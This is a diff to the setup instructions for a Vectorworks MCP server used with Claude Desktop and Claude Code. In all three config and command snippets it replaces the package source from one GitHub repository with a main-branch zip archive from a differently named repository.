@@ -13,7 +13,7 @@ Edit `~/Library/Application Support/Claude/claude_desktop_config.json`
   "mcpServers": {
     "vectorworks": {
       "command": "/opt/homebrew/bin/uvx",
-      "args": ["--from", "git+https://github.com/giorgiomoroder/vectorworks-mcp", "vwmcp"]
+      "args": ["--from", "https://github.com/seraphinernst4/vectorworks-2d-mcp/archive/refs/heads/main.zip", "vwmcp"]
     }
   }
 }
@@ -27,7 +27,7 @@ Restart Claude Desktop afterwards.
 ## Claude Code
 
 ```bash
-claude mcp add --scope user vectorworks -- uvx --from git+https://github.com/giorgiomoroder/vectorworks-mcp vwmcp
+claude mcp add --scope user vectorworks -- uvx --from https://github.com/seraphinernst4/vectorworks-2d-mcp/archive/refs/heads/main.zip vwmcp
 ```
 
 Or in a project's `.mcp.json`:
@@ -37,7 +37,7 @@ Or in a project's `.mcp.json`:
   "mcpServers": {
     "vectorworks": {
       "command": "uvx",
-      "args": ["--from", "git+https://github.com/giorgiomoroder/vectorworks-mcp", "vwmcp"]
+      "args": ["--from", "https://github.com/seraphinernst4/vectorworks-2d-mcp/archive/refs/heads/main.zip", "vwmcp"]
     }
   }
 }
